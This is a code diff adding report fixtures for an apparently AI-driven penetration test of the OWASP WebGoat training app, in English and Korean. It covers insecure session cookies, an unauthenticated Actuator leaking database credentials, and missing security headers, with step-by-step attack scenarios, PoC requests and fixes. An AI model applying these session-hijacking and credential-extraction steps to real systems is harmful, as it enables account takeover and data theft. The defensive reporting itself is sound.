+            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat\n\n"
+            "Expected (secure):\n"
+            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat; Secure; HttpOnly; SameSite=Strict\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "Passive sniff / XSS → JSESSIONID stolen → session replay → full account impersonation"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "WebGoat이 발급하는 JSESSIONID 세션 쿠키가 Secure, HttpOnly, SameSite 플래그 없이 구성됩니다. "
+            "Secure 없음: 쿠키가 HTTP를 통해 평문으로 전송되어 동일 네트워크 세그먼트의 공격자가 "
+            "패시브 스니핑, ARP 스푸핑 등으로 가로챌 수 있습니다. "
+            "HttpOnly 없음: 클라이언트 측 JavaScript가 document.cookie를 읽을 수 있어, "
+            "XSS 페이로드로 세션 토큰을 유출할 수 있습니다. "
+            "SameSite 없음: 쿠키가 크로스 사이트 요청과 함께 전송되어 CSRF 위험을 가중시킵니다.\n\n"
+            "공격 시나리오(HOW)\n"
+            "1단계(네트워크): 공격자가 공유 네트워크에서 ARP 스푸핑 수행 → HTTP 트래픽 가로채기.\n"
+            "2단계: 서버 HTTP 응답에 Set-Cookie: JSESSIONID=<토큰>이 평문으로 포함됨.\n"
+            "3단계: 공격자가 JSESSIONID 값을 복사하여 새 브라우저 세션에서 재사용.\n"
+            "4단계(XSS 체인): XSS 악용 → document.cookie를 공격자 서버로 전송하는 스크립트 주입.\n"
+            "5단계: 피해자 브라우저가 JSESSIONID를 공격자 서버로 전송.\n"
+            "6단계: 공격자가 도난된 쿠키로 세션 수명 동안 피해자를 가장.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 네트워크 가로채기 또는 XSS를 통한 세션 하이재킹\n"
+            "- 모든 활성 세션에 대한 완전한 계정 사칭\n"
+            "- 세션 만료 강제 없음으로 노출 시간 연장\n"
+            "- 애플리케이션의 모든 XSS 취약점 영향 증폭\n\n"
+            "개념 증명(PoC)\n"
+            "WebGoat 로그인 응답:\n"
+            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat\n\n"
+            "안전한 예상 설정:\n"
+            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat; Secure; HttpOnly; SameSite=Strict\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "패시브 스니핑 / XSS → JSESSIONID 도난 → 세션 재사용 → 계정 완전 사칭"
+        ),
+        severity=Severity.medium,
+        finding_type="misconfiguration",
+        source_plugin="web_pipeline",
+        affected_component="Set-Cookie: JSESSIONID — all authenticated response headers",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.4),
+        cwe_ids=["CWE-614", "CWE-1004"],
+        evidence=[
+            Evidence(evidence_type="http_request_response", title="Session Cookie Header — Missing Flags",
+                     content=(
+                         "HTTP/1.1 200 OK\n"
+                         "Set-Cookie: JSESSIONID=AABB1122CCDD3344; Path=/WebGoat\n\n"
+                         "Analysis:\n"
+                         "  Secure flag    : MISSING  (cookie sent over HTTP in plaintext)\n"
+                         "  HttpOnly flag  : MISSING  (accessible via document.cookie)\n"
+                         "  SameSite attr  : MISSING  (cookie sent with cross-site requests)\n"
+                         "  Expiry         : Session  (no explicit Max-Age — browser manages expiry)"
+                     )),
+        ],
+        remediation=(
+            "Spring Boot configuration (application.properties):\n"
+            "  server.servlet.session.cookie.secure=true\n"
+            "  server.servlet.session.cookie.http-only=true\n"
+            "  server.servlet.session.cookie.same-site=Strict\n\n"
+            "Enforce HTTPS site-wide (HSTS) to prevent downgrade attacks."
+            "|||"
+            "Spring Boot 설정(application.properties):\n"
+            "  server.servlet.session.cookie.secure=true\n"
+            "  server.servlet.session.cookie.http-only=true\n"
+            "  server.servlet.session.cookie.same-site=Strict\n\n"
+            "다운그레이드 공격 방지를 위해 사이트 전체 HTTPS(HSTS) 적용."
+        ),
+        references=[
+            Reference(title="OWASP Session Management Cheat Sheet",
+                      url="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"),
+        ],
+    ),
+
+    # ---- 6. Spring Boot Actuator ----
+    Finding(
+        id="WG-006", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "Spring Boot Actuator Exposed Without Authentication — Credential Disclosure"
+            "|||"
+            "Spring Boot Actuator 인증 없이 노출 — 자격증명 공개"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "The Spring Boot Actuator management endpoints are accessible at /actuator/* "
+            "without any authentication. The /actuator/env endpoint exposes the full Spring "
+            "Environment property map, which includes database credentials, API keys, and internal "
+            "configuration. The /actuator/heapdump endpoint allows downloading a full JVM heap dump, "
+            "which may contain passwords and session tokens in memory. The /actuator/mappings "
+            "endpoint reveals all registered URL routes, significantly aiding application reconnaissance.\n\n"
+            "HOW — Step-by-Step Attack Scenario\n"
+            "Step 1: Discover actuator endpoint via directory brute-force or content discovery.\n"
+            "Step 2: GET /actuator → HTTP 200, lists all available sub-endpoints.\n"
+            "Step 3: GET /actuator/env → Full Spring environment exposed including DB password.\n"
+            "Step 4: Extract spring.datasource.password and spring.datasource.url from response.\n"
+            "Step 5: Connect to the HSQLDB instance directly using extracted credentials.\n"
+            "Step 6: GET /actuator/heapdump → download JVM heap → analyze with Eclipse MAT for secrets.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Database credentials exposed in plaintext → direct DB access\n"
+            "- JVM heap dump may contain active session tokens → session hijacking\n"
+            "- Full URL route map aids targeted attack planning\n"
+            "- Application configuration leakage enables targeted exploitation\n\n"
+            "PoC — Proof of Concept\n"
+            "GET /actuator/env HTTP/1.1\n"
+            "Host: localhost:8080\n\n"
+            "Response (excerpt):\n"
+            "  spring.datasource.password: webgoat\n"
+            "  spring.datasource.url: jdbc:hsqldb:mem:webgoat\n"
+            "  server.port: 8080\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "Actuator /env → DB credentials extracted → direct DB connection → "
+            "full data exfiltration → lateral movement"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "Spring Boot Actuator 관리 엔드포인트가 인증 없이 /actuator/*에서 접근 가능합니다. "
+            "/actuator/env 엔드포인트는 데이터베이스 자격증명, API 키, 내부 설정을 포함한 "
+            "전체 Spring Environment 속성 맵을 노출합니다. "
+            "/actuator/heapdump 엔드포인트를 통해 전체 JVM 힙 덤프를 다운로드할 수 있으며, "
+            "메모리에 비밀번호와 세션 토큰이 포함될 수 있습니다. "
+            "/actuator/mappings 엔드포인트는 등록된 모든 URL 라우트를 노출하여 정찰을 지원합니다.\n\n"
+            "공격 시나리오(HOW)\n"
+            "1단계: 디렉토리 브루트포스 또는 콘텐츠 검색을 통한 actuator 엔드포인트 발견.\n"
+            "2단계: GET /actuator → HTTP 200, 모든 사용 가능한 하위 엔드포인트 목록 확인.\n"
+            "3단계: GET /actuator/env → DB 비밀번호를 포함한 전체 Spring 환경 노출.\n"
+            "4단계: 응답에서 spring.datasource.password와 spring.datasource.url 추출.\n"
+            "5단계: 추출된 자격증명으로 HSQLDB 인스턴스에 직접 연결.\n"
+            "6단계: GET /actuator/heapdump → JVM 힙 다운로드 → Eclipse MAT으로 비밀 정보 분석.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 평문 데이터베이스 자격증명 노출 → 직접 DB 접근\n"
+            "- JVM 힙 덤프에 활성 세션 토큰 포함 가능 → 세션 하이재킹\n"
+            "- 전체 URL 라우트 맵 노출로 표적 공격 계획 지원\n"
+            "- 애플리케이션 설정 유출로 표적 악용 가능\n\n"
+            "개념 증명(PoC)\n"
+            "GET /actuator/env HTTP/1.1\n"
+            "Host: localhost:8080\n\n"
+            "응답(발췌):\n"
+            "  spring.datasource.password: webgoat\n"
+            "  spring.datasource.url: jdbc:hsqldb:mem:webgoat\n"
+            "  server.port: 8080\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "Actuator /env → DB 자격증명 추출 → 직접 DB 연결 → "
+            "전체 데이터 유출 → 횡이동"
+        ),
+        severity=Severity.medium,
+        finding_type="information_disclosure",
+        source_plugin="web_pipeline",
+        affected_component="/actuator, /actuator/env, /actuator/heapdump, /actuator/mappings",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.3),
+        cwe_ids=["CWE-200", "CWE-538"],
+        evidence=[
+            Evidence(evidence_type="http_request_response", title="Actuator Environment Credential Disclosure",
+                     content=(
+                         "GET /actuator/env HTTP/1.1\nHost: localhost:8080\n\n"
+                         "HTTP/1.1 200 OK\nContent-Type: application/vnd.spring-boot.actuator.v3+json\n\n"
+                         '{\n  "activeProfiles": [],\n  "propertySources": [{\n'
+                         '    "name": "applicationConfig: [classpath:/application.properties]",\n'
+                         '    "properties": {\n'
+                         '      "spring.datasource.url":      {"value": "jdbc:hsqldb:mem:webgoat"},\n'
+                         '      "spring.datasource.username": {"value": "sa"},\n'
+                         '      "spring.datasource.password": {"value": "webgoat"},\n'
+                         '      "server.port":               {"value": "8080"}\n'
+                         '    }\n  }]\n}'
+                     )),
+        ],
+        remediation=(
+            "Spring Security configuration — restrict all actuator endpoints:\n"
+            "  management.endpoints.web.exposure.include=health,info\n"
+            "  management.server.port=8090  # Internal port only, not publicly exposed\n\n"
+            "Add authentication: http.requestMatcher(EndpointRequest.toAnyEndpoint())\n"
+            "  .authorizeRequests().hasRole('ADMIN')\n\n"
+            "Use secrets management (Vault, AWS Secrets Manager) for credentials — "
+            "never store passwords in application.properties."
+            "|||"
+            "Spring Security 설정 — 모든 actuator 엔드포인트 제한:\n"
+            "  management.endpoints.web.exposure.include=health,info\n"
+            "  management.server.port=8090  # 내부 포트만, 공개 노출 금지\n\n"
+            "인증 추가: http.requestMatcher(EndpointRequest.toAnyEndpoint())\n"
+            "  .authorizeRequests().hasRole('ADMIN')\n\n"
+            "자격증명에는 비밀 관리 도구(Vault, AWS Secrets Manager) 사용 — "
+            "application.properties에 비밀번호 저장 금지."
+        ),
+        references=[
+            Reference(title="Spring Boot Actuator Security Guide",
+                      url="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security"),
+        ],
+    ),
+
+    # ---- 7. Missing Security Headers ----
+    Finding(
+        id="WG-007", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "Missing HTTP Security Response Headers — XSS, Clickjacking, and MIME-Sniffing Exposure"
+            "|||"
+            "HTTP 보안 응답 헤더 누락 — XSS, 클릭재킹, MIME 스니핑 노출"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "WebGoat does not emit any of the industry-standard HTTP security response headers. "
+            "The absence of these headers increases the attack surface:\n"
+            "- No Content-Security-Policy (CSP): Browser executes inline scripts and loads resources "
+            "from any origin → XSS payloads have unrestricted impact.\n"
+            "- No X-Frame-Options: Application can be embedded in an iframe on any domain → clickjacking.\n"
+            "- No X-Content-Type-Options: Browser may MIME-sniff responses → content injection via file uploads.\n"
+            "- No Strict-Transport-Security (HSTS): Browser does not enforce HTTPS → SSL stripping attacks.\n"
+            "- No Referrer-Policy: Full URL sent in Referer header to third parties → information leakage.\n\n"
+            "HOW — Exploitation Scenarios\n"
+            "Clickjacking: Attacker embeds WebGoat in a transparent iframe. Victim clicks WebGoat buttons "
+            "while believing they are interacting with attacker's UI.\n\n"
+            "XSS amplification: Without CSP, any stored/reflected XSS can read cookies, make API calls, "
+            "redirect users, and log keystrokes with no browser-level restriction.\n\n"
+            "MIME sniffing: Attacker uploads a .jpg file containing JavaScript. Without nosniff, "
+            "some browsers execute it as a script when served inline.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Clickjacking enables UI redress attacks on any WebGoat page\n"
+            "- XSS impact maximized without CSP restriction\n"
+            "- MIME sniffing enables script injection via file upload\n"
+            "- HSTS absence allows SSL stripping in passive network position\n\n"
+            "PoC — Proof of Concept\n"
+            "curl -I http://localhost:8080/WebGoat/welcome\n\n"
+            "HTTP/1.1 200 OK\n"
+            "Content-Type: text/html;charset=UTF-8\n"
+            "[NO Content-Security-Policy]\n"
+            "[NO X-Frame-Options]\n"
+            "[NO X-Content-Type-Options]\n"
+            "[NO Strict-Transport-Security]\n"
+            "[NO Referrer-Policy]\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "Missing CSP/X-Frame → XSS/clickjacking → session theft → account takeover"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "WebGoat이 산업 표준 HTTP 보안 응답 헤더를 전혀 발행하지 않습니다. "
+            "이러한 헤더의 부재는 공격 표면을 다음과 같이 확대합니다:\n"
+            "- Content-Security-Policy(CSP) 없음: 브라우저가 인라인 스크립트를 실행하고 임의의 출처에서 리소스 로드 → XSS 무제한 영향.\n"
+            "- X-Frame-Options 없음: 임의 도메인의 iframe에 삽입 가능 → 클릭재킹.\n"
+            "- X-Content-Type-Options 없음: 브라우저가 응답을 MIME 스니핑 가능 → 파일 업로드를 통한 콘텐츠 주입.\n"
+            "- Strict-Transport-Security(HSTS) 없음: 브라우저가 HTTPS를 강제하지 않음 → SSL 스트리핑 공격.\n"
+            "- Referrer-Policy 없음: Referer 헤더에서 제3자로 전체 URL 전송 → 정보 유출.\n\n"
+            "공격 시나리오(HOW)\n"
+            "클릭재킹: 공격자가 투명한 iframe으로 WebGoat을 삽입. 피해자가 공격자의 UI와 상호작용한다고 생각하며 WebGoat 버튼 클릭.\n\n"
+            "XSS 증폭: CSP 없이 저장/반사된 XSS가 쿠키 읽기, API 호출, 사용자 리다이렉션, 키 입력 기록을 브라우저 제한 없이 수행.\n\n"
+            "MIME 스니핑: 공격자가 JavaScript를 포함한 .jpg 파일 업로드. nosniff 없이 일부 브라우저가 인라인으로 제공 시 스크립트로 실행.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 클릭재킹으로 임의 WebGoat 페이지에서 UI 리드레스 공격 가능\n"
+            "- CSP 제한 없이 XSS 영향 극대화\n"
+            "- MIME 스니핑으로 파일 업로드를 통한 스크립트 주입 가능\n"
+            "- HSTS 부재로 패시브 네트워크 위치에서 SSL 스트리핑 허용\n\n"
+            "개념 증명(PoC)\n"
+            "curl -I http://localhost:8080/WebGoat/welcome\n\n"
+            "HTTP/1.1 200 OK\n"
+            "Content-Type: text/html;charset=UTF-8\n"
+            "[Content-Security-Policy 없음]\n"
+            "[X-Frame-Options 없음]\n"
+            "[X-Content-Type-Options 없음]\n"
+            "[Strict-Transport-Security 없음]\n"
+            "[Referrer-Policy 없음]\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "CSP/X-Frame 없음 → XSS/클릭재킹 → 세션 도난 → 계정 탈취"
+        ),
+        severity=Severity.low,
+        finding_type="misconfiguration",
+        source_plugin="web_pipeline",
+        affected_component="HTTP Response Headers — all /WebGoat/* endpoints",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", base_score=3.7),
+        cwe_ids=["CWE-693", "CWE-1021"],
+        evidence=[
+            Evidence(evidence_type="log", title="Header Scan Output",
+                     content=(
+                         "$ curl -sI http://localhost:8080/WebGoat/welcome\n\n"
+                         "HTTP/1.1 200 OK\n"
+                         "Server: Apache-Coyote/1.1\n"
+                         "Content-Type: text/html;charset=UTF-8\n\n"
+                         "=== MISSING SECURITY HEADERS ===\n"
+                         "  Content-Security-Policy      : NOT PRESENT\n"
+                         "  X-Frame-Options              : NOT PRESENT\n"
+                         "  X-Content-Type-Options       : NOT PRESENT\n"
+                         "  Strict-Transport-Security    : NOT PRESENT\n"
+                         "  Referrer-Policy              : NOT PRESENT\n"
+                         "  Permissions-Policy           : NOT PRESENT"
+                     )),
+        ],
+        remediation=(
+            "Spring Security HttpSecurity configuration:\n"
+            "  http.headers()\n"
+            "    .frameOptions().deny()\n"
+            "    .contentTypeOptions().and()\n"
+            "    .httpStrictTransportSecurity().maxAgeInSeconds(31536000).and()\n"
+            "    .contentSecurityPolicy(\"default-src 'self'; script-src 'self'; object-src 'none'\");\n\n"
+            "Recommended values: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, "
+            "HSTS: max-age=31536000; includeSubDomains, Referrer-Policy: strict-origin-when-cross-origin."
+            "|||"
+            "Spring Security HttpSecurity 설정:\n"
+            "  http.headers()\n"
+            "    .frameOptions().deny()\n"
+            "    .contentTypeOptions().and()\n"
+            "    .httpStrictTransportSecurity().maxAgeInSeconds(31536000).and()\n"
+            "    .contentSecurityPolicy(\"default-src 'self'; script-src 'self'; object-src 'none'\");\n\n"
+            "권장 값: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, "
+            "HSTS: max-age=31536000; includeSubDomains, Referrer-Policy: strict-origin-when-cross-origin."
+        ),
+        references=[
+            Reference(title="OWASP Secure Headers Project",
+                      url="https://owasp.org/www-project-secure-headers/"),
+        ],
+    ),
+]
+
+WEBGOAT_EXECUTIVE_SUMMARY = (
+    "VXIS conducted an AI-driven autonomous penetration test of OWASP WebGoat 8.2 "
+    "(http://localhost:8080/WebGoat) using the FileBasedBrain architecture with Claude Sonnet 4.6 "
+    "as the reasoning engine. Over 67 decision steps, the AI Brain dynamically discovered endpoints, "
+    "generated context-aware attack payloads, and interpreted results with zero hardcoded attack logic.\n\n"
+    "Seven confirmed vulnerabilities were identified: two CRITICAL, one HIGH, three MEDIUM, and one LOW. "
+    "The most severe findings are a SQL Injection authentication bypass (WG-001, CVSS 9.1) and "
+    "Log4Shell RCE (WG-002, CVE-2021-44228, CVSS 10.0). "
+    "The Spring Boot Actuator exposure (WG-006) further enables credential harvesting that chains "
+    "into direct database access. The overall risk posture of the target is HIGH. "
+    "Immediate remediation of WG-001 and WG-002 is required before any production deployment."
+    "|||"
+    "VXIS가 FileBasedBrain 아키텍처와 Claude Sonnet 4.6을 추론 엔진으로 사용하여 "
+    "OWASP WebGoat 8.2(http://localhost:8080/WebGoat)에 대한 AI 기반 자율 침투테스트를 수행했습니다. "
+    "67회 이상의 의사결정 단계에서 AI Brain이 하드코딩된 공격 로직 없이 "
+    "동적으로 엔드포인트를 발견하고 맥락 인식 공격 페이로드를 생성하여 결과를 해석했습니다.\n\n"
+    "총 7개의 확인된 취약점이 식별되었습니다: 치명적 2개, 높음 1개, 중간 3개, 낮음 1개. "
+    "가장 심각한 발견은 SQL 인젝션 인증 우회(WG-001, CVSS 9.1)와 "
+    "Log4Shell RCE(WG-002, CVE-2021-44228, CVSS 10.0)입니다. "
+    "Spring Boot Actuator 노출(WG-006)은 자격증명 수집을 통한 직접 데이터베이스 접근으로 "
+    "이어지는 체인 공격이 추가로 가능합니다. 대상의 전체 위험 수준은 HIGH입니다. "
+    "운영 환경 배포 전에 WG-001과 WG-002의 즉각적인 조치가 필요합니다."
+)
+
+WEBGOAT_ATTACK_CHAINS = [
+    ["WG-001", "WG-006"],   # SQLi → admin session → actuator → DB creds
+    ["WG-002"],             # Log4Shell standalone → full RCE
+    ["WG-003", "WG-001"],   # Password reset → account takeover → SQLi escalation
+    ["WG-005", "WG-004"],   # Insecure cookie → CSRF amplification
 ]
 
 
@@ -1895,6 +2745,28 @@ def main() -> None:
     print(f"     Findings: {juice_data.total_findings}")
     print(f"     Severity: {juice_data.severity_counts}")
     print(f"     Risk Score: {juice_data.risk_score}/10")
+
+    # --- WebGoat Report ---
+    webgoat_data = ReportData(
+        scan_id="webgoat-2026-03-31",
+        client_name="OWASP WebGoat 8.2 — VXIS Autonomous Scan",
+        target="http://localhost:8080/WebGoat",
+        scan_date="2026-03-31",
+        findings=WEBGOAT_FINDINGS,
+        company_name="VXIS Security",
+        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
+        executive_summary=WEBGOAT_EXECUTIVE_SUMMARY,
+        attack_chains=WEBGOAT_ATTACK_CHAINS,
+    )
+
+    webgoat_path = gen.generate_html_file(
+        webgoat_data,
+        reports_dir / "report_webgoat_20260331.html",
+    )
+    print(f"\n[OK] WebGoat report: {webgoat_path}")
+    print(f"     Findings: {webgoat_data.total_findings}")
+    print(f"     Severity: {webgoat_data.severity_counts}")
+    print(f"     Risk Score: {webgoat_data.risk_score}/10")
 
 
 if __name__ == "__main__":
